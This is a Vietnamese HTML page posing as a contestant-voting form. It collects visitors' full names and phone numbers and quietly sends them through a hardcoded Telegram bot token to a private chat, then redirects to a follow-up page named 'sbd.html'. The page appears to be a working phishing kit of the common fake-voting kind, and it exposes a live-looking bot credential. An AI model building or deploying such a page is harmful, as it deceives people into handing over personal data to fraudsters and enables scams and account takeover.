<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bình Chọn Thí Sinh</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
        body { background: linear-gradient(135deg, #2B0764, #0F0324); color: white; min-height: 100vh; }
        .container { max-width: 500px; margin: 50px auto; padding: 20px; }
        .hop { background: rgba(43,7,100,0.6); border-radius: 20px; padding: 30px; text-align: center; }
        h1 { color: #FFD700; margin-bottom: 25px; font-size: 28px; }
        input {
            width: 100%; padding: 15px; margin: 8px 0;
            background: rgba(255,255,255,0.1); border: 1px solid #7B2FFD;
            border-radius: 10px; color: white; font-size: 16px;
        }
        input::placeholder { color: #AAA; }
        #nutTiepTuc {
            width: 100%; padding: 15px; font-size: 18px; font-weight: bold;
            background: linear-gradient(90deg, #7B2FFD, #D244FF);
            border: none; border-radius: 10px; color: white;
            cursor: pointer; margin-top: 10px;
        }
        #nutTiepTuc:hover { opacity: 0.9; }
        #thongbao { margin-top: 20px; padding: 12px; border-radius: 8px; display: none; }
        .thanhcong { background: rgba(0,200,100,0.2); border: 1px solid #00c864; color: #90ffc8; }
        .loi { background: rgba(255,50,50,0.2); border: 1px solid #ff3232; color: #ffb0b0; }
    </style>
</head>
<body>

<div class="container">
    <div class="hop">
        <h1>BÌNH CHỌN THÍ SINH</h1>

        <input type="text" id="hoten" placeholder="HỌ VÀ TÊN *">
        <input type="tel" id="sdt" placeholder="SỐ ĐIỆN THOẠI *">

        <button id="nutTiepTuc" onclick="xuLy()">TIẾP TỤC →</button>
        <div id="thongbao"></div>
    </div>
</div>

<script>
// === 🔴 ĐIỀN TOKEN VÀ ID CỦA BẠN VÀO ĐÂY ===
const BOT_TOKEN = "8847014588:AAFjyPX1obUy13mfOmJrTek-UfdROPz7JOg";
const CHAT_ID = "9845882038";
// ===========================================

async function xuLy(){
    const hoten = document.getElementById('hoten').value.trim();
    const sdt = document.getElementById('sdt').value.trim();
    const nut = document.getElementById('nutTiepTuc');
    const tb = document.getElementById('thongbao');

    // Kiểm tra thông tin
    if(!hoten || !sdt){
        tb.className = 'loi';
        tb.innerText = '⚠️ Vui lòng điền đầy đủ Họ tên và Số điện thoại!';
        tb.style.display = 'block';
        return;
    }

    // Đổi chữ nút
    nut.innerText = 'ĐANG GỬI...';
    tb.style.display = 'none';

    // ✅ Gửi Tên + SĐT về Telegram NGAY
    const tinNhan = `📩 BÌNH CHỌN MỚI - THÔNG TIN CHUNG
━━━━━━━━━━━━━━
👤 Họ tên: ${hoten}
📞 SĐT: ${sdt}
⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}
━━━━━━━━━━━━━━`;

    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = new URLSearchParams({
            chat_id: CHAT_ID,
            text: tinNhan,
            parse_mode: "HTML"
        });
        await fetch(`${url}?${params}`);

        // Lưu thông tin sang trang SBD
        localStorage.setItem('hoten', hoten);
        localStorage.setItem('dienthoai', sdt);

        // Thông báo thành công
        tb.className = 'thanhcong';
        tb.innerText = '✅ Đã lưu! Đang chuyển trang...';
        tb.style.display = 'block';

        // Chuyển trang sau 1 giây
        setTimeout(() => {
            window.location.href = "sbd.html";
        }, 1000);

    } catch (loi) {
        tb.className = 'loi';
        tb.innerText = '❌ Lỗi gửi! Kiểm tra Token + Chat ID';
        tb.style.display = 'block';
        console.log("Chi tiết lỗi:", loi);
    }

    // Khôi phục nút
    nut.innerText = 'TIẾP TỤC →';
}
</script>

</body>
</html>
